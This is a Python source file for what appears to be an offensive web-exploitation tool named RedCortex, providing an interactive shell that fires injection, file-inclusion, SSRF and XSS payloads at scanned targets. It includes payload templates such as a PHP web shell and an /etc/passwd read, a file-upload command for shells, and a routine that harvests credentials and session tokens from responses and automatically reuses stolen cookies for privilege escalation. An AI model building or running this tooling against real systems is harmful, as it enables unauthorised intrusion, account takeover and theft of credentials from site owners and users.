from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.styles import Style
from requests_toolbelt.multipart.encoder import MultipartEncoder
import os
import random
import re
import requests

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:52.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2)",
    "Mozilla/5.0 (Android 10; SM-G973F)"
]

def auto_chain_escalate(resp, shell_state):
    """Detect creds/tokens/admin indicators and offer privilege escalation."""
    body = resp.text
    creds = re.findall(r"([a-zA-Z0-9_.-]+):([a-zA-Z0-9_.-]+)", body)
    if creds:
        print(f"\n[CHAIN] 🎯 Possible credentials found: {creds}\n")
        shell_state['auto_creds'] = creds
    # Detect token or sessionid
    session = re.search(r"(sessionid|token|jwt)[=:\"']?([a-zA-Z0-9_.-]+)", body, re.I)
    if session:
        print(f"\n[CHAIN] 🪪 Session/Auth token detected: {session.group(1)}={session.group(2)}")
        shell_state.setdefault('custom_headers', {})
        shell_state['custom_headers']['Cookie'] = f"{session.group(1)}={session.group(2)}"
        print("[Auto-cookie] Now sending with this cookie!")
    # Admin dashboard indicator
    if "admin" in body.lower() and ("dashboard" in body.lower() or "panel" in body.lower()):
        print("\n[ESCALATE] Looks like an admin panel page! Try further privilege escalation or user dump?\n")
    if creds or session:
        print("[Auto-Chain] Next commands will auto-apply found creds/cookies unless you 'clearheaders'.")

def interactive_shell(results, session={}):
    print("\n=== RedCortex Interactive Exploit Shell ===")
    print("Type 'help' anytime for command list, usage, and live examples.\n")

    targets = []
    for idx, r in enumerate(results):
        if r[0] in ("SQLi-Boolean", "SQLi-Error", "SQLi-Union", "LFI", "IDOR", "SSRF", "XSS"):
            print(f"[{idx}] {r[0]} ==> {r[1]} (param: {r[2]})")
            targets.append(r)

    shell_style = Style.from_dict({'': '#fffd97', 'cmd': '#79ff7f bold'})
    history = []
    custom_headers = {"User-Agent": random.choice(USER_AGENTS)}
    default_target = None
    shell_state = {"custom_headers": custom_headers}

    templates = {
        'sqli': "' OR 1=1--",
        'xss': "<svg/onload=alert(1337)>",
        'lfi': "../../etc/passwd",
        'idor': "2",
        'ssrf': "http://127.0.0.1/",
        'post_json': '{"param":"payload"}',
        'upload_php': "<?php system($_GET['cmd']); ?>"
    }
    commands = [
        "get", "post", "raw", "upload", "header", "clearheaders", "use", "template",
        "show", "help", "last", "history", "exit", "quit"
    ]
    completer = WordCompleter(commands, ignore_case=True)

    while True:
        try:
            cmdline = prompt('cmd> ', completer=completer, style=shell_style).strip()
        except KeyboardInterrupt:
            print("\nExiting interactive exploit shell.")
            break

        if cmdline in ("exit", "quit"):
            break
        if cmdline in ("help", "?"):
            print("\n\033[1mUsage/Examples:\033[0m")
            print("  use 0")
            print("  get id ' OR 1=1--")
            print("  post cmd whoami")
            print("  raw data <shellcode>")
            print("  upload file ./shell.php")
            print("  header Cookie:SESSION=deadbeefcafebabe")
            print("  template lfi")
            print("  last                 # Repeat last exploit")
            print("  show                 # Show scan targets")
            print("  clearheaders         # Reset custom headers")
            print("\nCommands: use, get, post, raw, upload, header, clearheaders, template, show, help, last, history, exit\n")
            print("Templates: " + ", ".join(templates.keys()))
            print("\033[1mPro Tips:\033[0m")
            print("- After grabbing a session/creds, shell will auto-add cookie for chain attacks.")
            print("- Use up/down arrows to repeat or modify previous exploits.\n")
            continue

        if cmdline == "show":
            for idx, r in enumerate(targets):
                print(f"[{idx}] {r[0]} ==> {r[1]} (param: {r[2]})")
            continue
        if cmdline.startswith("use "):
            try:
                i = int(cmdline.split()[1])
                default_target = targets[i]
                print(f"Now using: [{i}] {default_target[1]} (param: {default_target[2]})")
            except:
                print("Invalid target index.")
            continue
        if cmdline.startswith("template "):
            ttype = cmdline.split(maxsplit=1)[1] if len(cmdline.split()) > 1 else ""
            payload = templates.get(ttype, None)
            if payload:
                print(f"[Template for {ttype}]:\n{payload}\n")
            else:
                print("Template types: " + ", ".join(templates.keys()))
            continue
        if cmdline.startswith("header "):
            try:
                kv = cmdline[7:].split(":",1)
                shell_state['custom_headers'][kv[0].strip()] = kv[1].strip()
                print(f"[+] Header set: {kv[0].strip()} = {kv[1].strip()}")
            except:
                print("Header error. Use header Name:Value format.")
            continue
        if cmdline == "clearheaders":
            shell_state['custom_headers'] = {"User-Agent": random.choice(USER_AGENTS)}
            print("[+] Custom headers cleared.")
            continue
        if cmdline == "history":
            for i, h in enumerate(history):
                print(f"{i}: {h}")
            continue
        if cmdline == "last":
            if history:
                cmdline = history[-1]
                print(f"[Repeating]: {cmdline}")
            else:
                print("No history yet.")
                continue

        # GET/POST/RAW/UPLOAD
        if cmdline.startswith("get "):
            if not default_target:
                print("Use 'use <index>' first to select a target.")
                continue
            parts = cmdline.split(maxsplit=2)
            if len(parts)<3:
                print("Format: get <param> <payload>")
                continue
            param, payload = parts[1], parts[2]
            params = {param: payload}
            print(f"[+] GET {default_target[1]} {params} (headers {shell_state['custom_headers']})")
            try:
                resp = requests.get(default_target[1], params=params, headers=shell_state['custom_headers'], timeout=10)
                print(f"[{resp.status_code}] {resp.reason}\n{resp.text[:800]}")
                history.append(cmdline)
                auto_chain_escalate(resp, shell_state)
            except Exception as e:
                print(f"[error] {e}")

        elif cmdline.startswith("post "):
            if not default_target:
                print("Use 'use <index>' first to select a target.")
                continue
            parts = cmdline.split(maxsplit=2)
            if len(parts)<3:
                print("Format: post <param> <payload>")
                continue
            param, payload = parts[1], parts[2]
            json_data = {param: payload}
            print(f"[+] POST {default_target[1]} {json_data} (headers {shell_state['custom_headers']})")
            try:
                resp = requests.post(default_target[1], json=json_data, headers=shell_state['custom_headers'], timeout=10)
                print(f"[{resp.status_code}] {resp.reason}\n{resp.text[:800]}")
                history.append(cmdline)
                auto_chain_escalate(resp, shell_state)
            except Exception as e:
                print(f"[error] {e}")

        elif cmdline.startswith("raw "):
            if not default_target:
                print("Use 'use <index>' first to select a target.")
                continue
            parts = cmdline.split(maxsplit=2)
            if len(parts)<3:
                print("Format: raw <param> <payload>")
                continue
            param, payload = parts[1], parts[2]
            print(f"[+] RAW POST {default_target[1]}: {param}={payload}")
            try:
                resp = requests.post(default_target[1], data=payload, headers=shell_state['custom_headers'], timeout=10)
                print(f"[{resp.status_code}] {resp.reason}\n{resp.text[:800]}")
                history.append(cmdline)
                auto_chain_escalate(resp, shell_state)
            except Exception as e:
                print(f"[error] {e}")

        elif cmdline.startswith("upload "):
            if not default_target:
                print("Use 'use <index>' first to select a target.")
                continue
            parts = cmdline.split(maxsplit=2)
            if len(parts)<3:
                print("Format: upload <param> <filepath>")
                continue
            param, filepath = parts[1], parts[2]
            try:
                m = MultipartEncoder(fields={param: (os.path.basename(filepath), open(filepath, 'rb'))})
                headers = dict(shell_state['custom_headers'])
                headers['Content-Type'] = m.content_type
                print(f"[+] UPLOAD POST {default_target[1]} param={param} file={filepath} (headers {headers})")
                resp = requests.post(default_target[1], data=m, headers=headers, timeout=20)
                print(f"[{resp.status_code}] {resp.reason}\n{resp.text[:800]}")
                history.append(cmdline)
                auto_chain_escalate(resp, shell_state)
            except Exception as e:
                print(f"[error/upload] {e}")

        else:
            print("Unknown command. Type 'help' for usage.")
